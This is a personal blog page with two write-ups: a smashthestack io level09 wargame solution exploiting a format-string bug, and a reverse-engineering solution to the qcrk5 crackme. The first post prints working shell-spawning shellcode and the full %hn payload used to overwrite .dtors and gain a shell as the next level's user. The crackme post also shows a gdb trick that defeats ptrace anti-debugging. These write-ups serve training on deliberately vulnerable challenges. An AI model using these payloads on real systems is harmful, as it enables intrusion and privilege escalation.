<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Álvaro Felipe Melchor &middot; Stuff about everything
    
    Álvaro Felipe Melchor
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/pic.png">
                                 <link rel="shortcut icon" href="/public/pic.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">

  <!--<link rel="stylesheet" href="/public/css/highlight/styles/monokai.css">
  <script src="/public/css/highlight/highlight.pack.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>-->

</head>


  <body>

    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          Álvaro Felipe Melchor
        </a>
      </h1>
      <p class="lead">Stuff about everything</p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item" href="/">Home</a>

      

      
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/about.html">About</a>
          
        
      
        
          
            <a class="sidebar-nav-item" href="/archive.html">Archive</a>
          
        
      
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      

      <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
    </nav>

    <p>&copy; 2015. All rights reserved.</p>
  </div>
</div>


    <div class="content container">
      <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/posts/level09iosmash">
        Format Strings - Level09 smashTheStack
      </a>
    </h1>

    <span class="post-date">12 Mar 2015</span>

    <p>The topic for this entry is about format string vulnerability. The vulnerability appears when we use functions as <code>printf</code> and so on wrongly.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>  <span class="c1">//Good</span>
<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// wrong - What would happen if buf is &quot;%x%x%x&quot;?</span>
</code></pre></div>
<p>When we call the latest printf call we are going to read from the stack. The layout would be the following</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">     Top of the Stack
-------------------------
|       Address of buf  |
-------------------------
|       Value of %x     |
-------------------------
|       Value of %x     |
-------------------------
|       Value of %x     |
-------------------------
|        ....           |
-------------------------
  Bottom of the Stack
</code></pre></div>
<p>The fun of this is that you can read, write on whatever direction you want. I am not going to write about how to do it since other have written before about <a href="http://inst.eecs.berkeley.edu/%7Ecs161/sp08/Notes/formatstring-1.2.pdf">this</a>.</p>

<p>The code to exploit is the level09 from <a href="http://io.smashthestack.org">io.smashthestack.org</a>.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span>  <span class="n">pad</span> <span class="o">=</span> <span class="mh">0xbabe</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ ./level09 AAAA%x%x%x%x
AAAAbffffe343ff160d7c41414141
level9@io:/levels$ ./level09 AAAA4%4\$x
AAAA441414141
</code></pre></div>
<p>The idea is instead of <code>AAAA</code> that does nothing, write an interesting direction using <code>%n</code> to alter the normal execution of our program. There are different paths to follow to exploit this little code but I am going to use <code>.dtors</code> section. For those that don&#39;t know about <code>.dtors</code> is a section that all binaries on linux compiled with <code>gcc</code> have it. This section has an array of functions that will be called when main function exits.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ nm level09
....
080494d4 d __DTOR_END__
080494d0 d __DTOR_LIST__
080484c4 r __FRAME_END__
....

level9@io:/levels$ objdump -h level09

level09:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
...

 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2
                  CONTENTS, ALLOC, LOAD, DATA
....
</code></pre></div>
<p>We can see that the section .dtors starts in <code>0x080494d0</code>.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text"> level9@io:/levels$ objdump -s -j .dtors level09

level09:     file format elf32-i386

Contents of section .dtors:
 80494d0 ffffffff 00000000                    ........
</code></pre></div>
<p>How we have said before the <code>.dtors</code> section is an array of functions. This array always starts with <code>0xffffffff</code> and ends with the NULL address <code>0x00000000</code>. It&#39;s easy to deduce that level09 does not have any destructor. But that is not a reason to give up since this section is writable we are going to be able to write our own destructor :).</p>

<p>The idea is write in <code>.dtors</code> with the goal of redirect the flow of the execution to the code that we will write in argv[1]. The first task that we must accomplish is to know the address of argv[1].</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">level9@io:/levels<span class="nv">$ </span><span class="k">for</span> <span class="o">((</span><span class="nv">i</span> <span class="o">=</span> 250<span class="p">;</span> i &lt; 330<span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&quot;$i: &quot;</span> <span class="o">&amp;&amp;</span> ./level09 <span class="s2">&quot;%$i\$s&quot;</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -n <span class="s1">$&#39;\n&#39;</span> <span class="p">;</span> <span class="k">done</span>

294: �É�
295: ,�
296: Segmentation fault
297: 1�^����PTRh
298: <span class="o">(</span>null<span class="o">)</span>
299: ������������U���<span class="o">=</span>Е
300: U���<span class="o">(</span>
301: Segmentation fault
302: 8���B���
303: U��WVS�O
304: U��<span class="o">]</span>Ít<span class="p">&amp;</span>
305: U��WV1�S辊
306:���
307:
308: Segmentation fault
309: ./level09
310: %310<span class="nv">$s</span>
311: <span class="o">(</span>null<span class="o">)</span>
312: <span class="nv">TERM</span><span class="o">=</span>xterm-256color
313: <span class="nv">SHELL</span><span class="o">=</span>/bin/bash
314: <span class="nv">SSH_CLIENT</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 22
315: <span class="nv">OLDPWD</span><span class="o">=</span>/tmp
316: <span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/5
317: <span class="nv">USER</span><span class="o">=</span>level9
318: <span class="nv">MAIL</span><span class="o">=</span>/var/mail/level9
319: <span class="nv">PATH</span><span class="o">=</span>/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
320: <span class="nv">PWD</span><span class="o">=</span>/levels
321: <span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8
322: <span class="nv">SHLVL</span><span class="o">=</span>1
323: <span class="nv">HOME</span><span class="o">=</span>/home/level9
324: <span class="nv">LANGUAGE</span><span class="o">=</span>en_GB:en
325: <span class="nv">LOGNAME</span><span class="o">=</span>level9
326: <span class="nv">SSH_CONNECTION</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 10.16.0.102 22
327: <span class="nv">LC_CTYPE</span><span class="o">=</span>es_ES.UTF-8
328: <span class="nv">_</span><span class="o">=</span>./level09
329: <span class="o">(</span>null<span class="o">)</span>

level9@io:/levels<span class="nv">$ </span>./level09 %310<span class="se">\$</span>x
bffffe42
</code></pre></div>
<p>Basically we have walked through the stack to read everything from it to extract where resides argv[1]. Using direct parameter access we know that argv[1] is in 310th position and around <code>0xbffffe42</code>.
The latest direction will vary regarding how many data we write. As much data we write in argv[1] the lower the address will be.</p>

<p>Using the short write we are able to write two bytes so we are going to need two directions to write in it followed by the payload.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
</code></pre></div>
<p><code>\xd6\x94\x04\x08</code> is to write <code>bfff</code> and in <code>\xd4\x94\x04\x08</code> to write the lower bytes of argv[1]&#39;s address. We should know how much characters we need before to use <code>%n</code> to write the desire number. The payload has a length of <code>0x38</code>.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
(gdb) p 0xbfff - 0x38
$1 = 49095
(gdb) p 0xfe42 - 0xbfff
$2 = 15939
</code></pre></div>
<p>We are going to need 49095 more characters before to use <code>%n</code> to write <code>0xbfff</code> in <code>0x080494d6</code> and about 15939 to write <code>fe42</code> in <code>0x080494d4</code> although that will not be the exact value we will need to write. All this can be accomplished using the width specifier.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn
</code></pre></div>
<p>This would be the first part of our payload. The problem is that we don&#39;t know where argv[1] is in the memory since the array has grown. But we can deduce it using format string.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hx%15939x%310\$hx

.....
3fffdf6
</code></pre></div>
<p>It&#39;s means that in <code>0xbffffdf6</code> is our argv[1].</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
(gdb) p 0xfdf6 - 0xbfff
$1 = 15863
</code></pre></div>
<p>The problem is that if we write <code>fdf6</code> the flow of the program will go at the beginning of argv[1] but the initial part are the directions of <code>.dtors</code>. The direction to write would be around <code>0xbffffdfa</code> where our payload really starts and it begins with a nop slide to augment our likelihood of success.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) p 0xfdfa - 0xbfff
$1 = 15867
</code></pre></div>
<p>And there it is, we have everything to exploit the vulnerability.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn%15867x%5\$hn

sh-4.2$ whoami
level10
sh-4.2$ cat /home/level10/.pass
Os**********
</code></pre></div>
<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&text=Format Strings - Level09 smashTheStack&via=alvaro_fe">share it with your followers</a>
or
<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/posts/qcrk5crackme">
        Defeating qcrk5 crackme
      </a>
    </h1>

    <span class="post-date">25 Feb 2015</span>

    <p>Today I am going to write up about how I resolved this <a href="http://crackmes.de/users/qnix/qcrk5/">crackme</a>. The level of this crackme is easy so it should not be difficult for those with the minimum of knowledge about reversing. This crackme like the majority of them ask for a password that we have to extract it, to bypass the check and win the flag.</p>

<p>The first task when we face against these challenges is to know the maximum about the binary. Basically the gather information phase.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">➜  crackmes  file qcrk5
qcrk5: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.4.1, stripped
</code></pre></div>
<p>It is a ELF-binary and is statically linked. So far, so good. Now we run strace to look for example what kind of syscall is doing.</p>
<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="err">➜</span>  <span class="n">crackmes</span>  <span class="n">strace</span> <span class="p">.</span><span class="o">/</span><span class="n">qcrk5</span> <span class="mi">1234</span>
<span class="n">execve</span><span class="p">(</span><span class="s">&quot;./qcrk5&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;./qcrk5&quot;</span><span class="p">,</span> <span class="s">&quot;1234&quot;</span><span class="p">],</span> <span class="p">[</span><span class="cm">/* 34 vars */</span><span class="p">])</span> <span class="o">=</span> <span class="mi">0</span>
<span class="p">[</span> <span class="n">Process</span> <span class="n">PID</span><span class="o">=</span><span class="mi">3869</span> <span class="n">runs</span> <span class="n">in</span> <span class="mi">32</span> <span class="n">bit</span> <span class="n">mode</span><span class="p">.</span> <span class="p">]</span>
<span class="n">uname</span><span class="p">({</span><span class="n">sys</span><span class="o">=</span><span class="s">&quot;Linux&quot;</span><span class="p">,</span> <span class="n">node</span><span class="o">=</span><span class="s">&quot;alvaro-debian&quot;</span><span class="p">,</span> <span class="p">...})</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">brk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                  <span class="o">=</span> <span class="mh">0x87fe000</span>
<span class="n">brk</span><span class="p">(</span><span class="mh">0x881f000</span><span class="p">)</span>                          <span class="o">=</span> <span class="mh">0x881f000</span>
<span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">)</span>          <span class="o">=</span> <span class="mi">3</span>
<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\277</span><span class="s">Y</span><span class="se">\307</span><span class="s">X&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>                <span class="o">=</span> <span class="mi">4</span>
<span class="n">close</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                <span class="o">=</span> <span class="mi">0</span>
<span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>       <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EPERM</span> <span class="p">(</span><span class="n">Operation</span> <span class="n">not</span> <span class="n">permitted</span><span class="p">)</span>
<span class="n">exit_group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                           <span class="o">=</span> <span class="o">?</span>
</code></pre></div>
<p>It has anti-debugging trick embedded inside the program. So is presumably that when we run the binary using gdb the same thing happens.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ r 1234
[Inferior 1 (process 3939) exited with code 01]
</code></pre></div>
<p>But with gdb we can bypass the ptrace syscall always returning the good value and that can be achieved writting in .gdbinit the following.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">catch syscall ptrace
commands 1
set ($eax) = 0
continue
end
</code></pre></div>
<p>Basically we are going to set up a <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Set-Catchpoints.html#Set-Catchpoints">catchpoint</a> each time that ptrace is called. Then using <code>commands 1</code> we are saying that each time that the breakpoint with value 1 (that is gonna be the catchpoint) is hit, we set <code>eax</code> to 0 and then continue the execution. Basically each time that ptrace is called is gonna return 0. Thanks to that, we are going to bypass the ptrace check and it lets us debug our binary. We could also bypass the ptrace check using <code>LD_PRELOAD</code> hooking a ptrace call and so on but this one is more easy and quickly to accomplish.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ r 1234

Catchpoint 1 (returned from syscall ptrace), 0x0804ea76 in ?? ()
Using 1234
Wrong!
[Inferior 1 (process 4011) exited normally]
</code></pre></div>
<p>It&#39;s time to dive in the binary to know what is going on in the main function. You can use either radare2 or Hopper to resolve it. I am going to use both. </p>
<div class="highlight"><pre><code class="language-text" data-lang="text">➜  crackmes  r2 qcrk5
 -- bash: r3: command not found
[0x08048110]&gt; aa
Function too big at 0x809824c
[0x08048110]&gt; afl
0x08048110  34  1  entry0
0x08048340  753  45  fcn.08048340
...
0x080503a3  235  19  fcn.080503a3
0x08048134  33  3  fcn.08048134
0x08048160  68  8  fcn.08048160
0x080481a4  99  6  fcn.080481a4
0x08048208  306  8  main
</code></pre></div>
<p>The main function is located at <code>0x08048208</code> so let&#39;s go ahead and disassemble it.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">[0x08048110]&gt; pdf@main
/ (fcn) main 306
|          ; var int local_8 @ ebp-0x8
|          ; var int local_4 @ ebp-0x4
|          ; var int local_14 @ ebp-0x14
|          ; arg int arg_4b7f3da0 @ ebp+0x4b7f3da0
|          ; arg int arg_8 @ ebp+0x8
|          ; arg int arg_c @ ebp+0xc
|          ; DATA XREF from 0x08048127 (entry0)
|          ; DATA XREF from 0x00000127 (fcn.0000010b)
|          ;-- main:
|          0x08048208    55           push ebp
|          0x08048209    89e5         mov ebp, esp
|          0x0804820b    83ec28       sub esp, 0x28
|          0x0804820e    83e4f0       and esp, 0xfffffff0
|          0x08048211    b800000000   mov eax, 0
|          0x08048216    83c00f       add eax, 0xf
|          0x08048219    83c00f       add eax, 0xf

...
</code></pre></div>
<p>The output is quite long and I am not going to write it. But for example in <code>0x0804824a</code> it calls a function passing four paramaters <code>0,0,1,0</code> and if <code>eax</code> is less than 0 the function returns. This is basically the ptrace call that stop us to debug the binary. Now I am going to use Hopper since it provides a decompiler that make the work easier for us.</p>
<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg2</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">esp</span> <span class="o">=</span> <span class="p">(</span><span class="n">esp</span> <span class="o">&amp;</span> <span class="mh">0xfffffff0</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x1e</span> <span class="o">&gt;&gt;</span> <span class="mh">0x4</span> <span class="o">&lt;&lt;</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x4b7f3da0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sub_804ea50</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">var_14</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">arg_0</span> <span class="o">!=</span> <span class="mh">0x2</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="n">arg_4</span><span class="p">;</span>
                    <span class="n">sub_8049530</span><span class="p">(</span><span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">,</span> <span class="s">&quot;Usage : %s &lt;password&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
                    <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">var_8</span> <span class="o">=</span> <span class="n">sub_08048b30</span><span class="p">();</span>
            <span class="o">*</span><span class="n">var_8</span> <span class="o">=</span> <span class="o">*</span><span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x5</span><span class="p">;</span>
            <span class="o">*</span><span class="n">var_8</span> <span class="o">=</span> <span class="o">*</span><span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">;</span>
            <span class="n">var_8</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_8</span> <span class="o">&lt;&lt;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">-</span> <span class="n">var_8</span><span class="p">;</span>
            <span class="n">var_8</span> <span class="o">=</span> <span class="n">var_8</span> <span class="o">*</span> <span class="mh">0x909090</span><span class="p">;</span>
            <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg_4</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
            <span class="n">sub_8049530</span><span class="p">(</span><span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">,</span> <span class="s">&quot;Using %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">var_4</span> <span class="o">==</span> <span class="n">var_8</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">;</span>
                    <span class="n">sub_8049530</span><span class="p">(</span><span class="n">STK33</span><span class="p">,</span> <span class="n">eax</span><span class="p">,</span> <span class="s">&quot;Correct, Cracked !!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                    <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">;</span>
            <span class="n">sub_8049530</span><span class="p">(</span><span class="n">STK33</span><span class="p">,</span> <span class="n">eax</span><span class="p">,</span> <span class="s">&quot;Wrong!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
            <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">eax</span> <span class="o">=</span> <span class="n">var_14</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">eax</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>We have to achieve that <code>var_8</code> be equal to <code>0x4b7f3da0</code>. We should know what returns <code>sub_08048b30()</code>. To know that, our best friend as always is gdb.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ b *0x08048208
Breakpoint 2 at 0x8048208
gdb-peda$ r 16

/******  
0x804829c:   call   0x8048be0
0x80482a1:   mov    DWORD PTR [ebp-0x8],eax
*******/
gdb-peda$ b *0x80482a1
Breakpoint 3 at 0x80482a1
gdb-peda$ c
gdb-peda$ p $eax
$1 = 0x10
</code></pre></div>
<p>So <code>var_8</code> is equal to argv[1]. <code>sub_08048b30()</code> must be <code>atoi</code> or other similar function.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include&lt;stdio.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">var8</span><span class="p">,</span><span class="n">temp</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>

  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">var8</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x5</span><span class="p">;</span>
    <span class="n">var8</span> <span class="o">=</span> <span class="n">var8</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">;</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">var8</span><span class="p">;</span>
    <span class="n">var8</span> <span class="o">=</span> <span class="p">(</span> <span class="n">var8</span> <span class="o">&lt;&lt;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">-</span> <span class="n">temp</span><span class="p">;</span>
    <span class="n">var8</span> <span class="o">=</span> <span class="n">var8</span> <span class="o">*</span> <span class="mh">0x909090</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">var8</span> <span class="o">==</span> <span class="mh">0x4b7f3da0</span><span class="p">){</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Key found %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
      <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">➜  /tmp  make pass
cc     pass.c   -o pass
➜  /tmp  ./pass
Key found 91867153
➜  crackmes  ./qcrk5  91867153
Using 91867153
Correct, Cracked !!
</code></pre></div>
<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/qcrk5crackme&text=Defeating qcrk5 crackme&via=alvaro_fe">share it with your followers</a>
or
<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>

  </div>
  
</div>

<div class="pagination">
  
    <a class="pagination-item older" href="/page2">Older</a>
  
  
    <span class="pagination-item newer">Newer</span>
  
</div>
    </div>

    

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-57722858-1', 'auto');
  ga('send', 'pageview');

</script>


  </body>
</html>
